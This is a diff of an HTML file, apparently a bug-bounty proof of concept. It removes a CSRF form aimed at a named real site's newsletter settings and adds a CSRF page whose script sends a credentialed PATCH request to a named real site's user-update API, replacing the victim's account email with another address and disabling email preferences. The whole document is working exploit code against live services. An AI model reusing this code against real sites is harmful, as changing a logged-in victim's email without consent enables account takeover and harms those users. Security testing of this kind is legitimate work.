@@ -1,14 +1,69 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <h3>CSRF Proof of Concept</h3>
-    <form action="https://profil.monxtra.be/manage-profile/newsletters/dats24?_data=routes%2Fmanage-profile%2B%2Fnewsletters%2B%2F%24commerceId%2Findex" method="POST">
-      <input type="hidden" name="hasAccepted" value="on">
-      <input type="hidden" name="communicationChannelId" value="1228">
-      <input type="hidden" name="communicationChannelType" value="EMAIL">
-      <input type="hidden" name="hasValidAddress" value="true">
-      <input type="hidden" name="isRobinsonMail" value="false">
-      <button type="submit">Submit CSRF Request</button>
-    </form>
-  </body>
+<head>
+  <title>CSRF PATCH PoC</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 1rem; }
+    pre { background: #f4f4f4; padding: 1rem; border-radius: 6px; max-height: 200px; overflow: auto; }
+    .error { color: red; }
+    .success { color: green; }
+    button {
+      padding: 0.5rem 1rem;
+      background: #007bff;
+      border: none;
+      border-radius: 4px;
+      color: white;
+      cursor: pointer;
+      margin-top: 1rem;
+    }
+    button:hover { background: #0056b3; }
+  </style>
+</head>
+<body>
+
+<h1>CSRF PATCH PoC</h1>
+<p>Click the button below to send a CSRF PATCH request to <code>https://army.rivals.com/api/v2/users/update</code></p>
+
+<button id="send">Send CSRF PATCH</button>
+
+<h2>Server Response:</h2>
+<pre id="output">No request sent yet.</pre>
+
+<script>
+document.getElementById('send').addEventListener('click', function() {
+  const output = document.getElementById('output');
+  output.textContent = 'Sending request...';
+  
+  fetch('https://army.rivals.com/api/v2/users/update', {
+    method: 'PATCH',
+    credentials: 'include',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      user: {
+        email: "testerr0092@gmail.com",
+        rivals_emails: false,
+        third_party_emails: false
+      }
+    })
+  })
+  .then(res => {
+    return res.text().then(body => ({status: res.status, ok: res.ok, body}));
+  })
+  .then(result => {
+    output.innerHTML = '';
+    if (!result.ok) {
+      output.innerHTML = `<span class="error">Error ${result.status}</span><br>${result.body}`;
+    } else {
+      output.innerHTML = `<span class="success">Success (${result.status})</span><br>${result.body}`;
+    }
+  })
+  .catch(error => {
+    output.innerHTML = '<span class="error">Error: ' + error.message + '</span>';
+  });
+});
+</script>
+
+</body>
 </html>
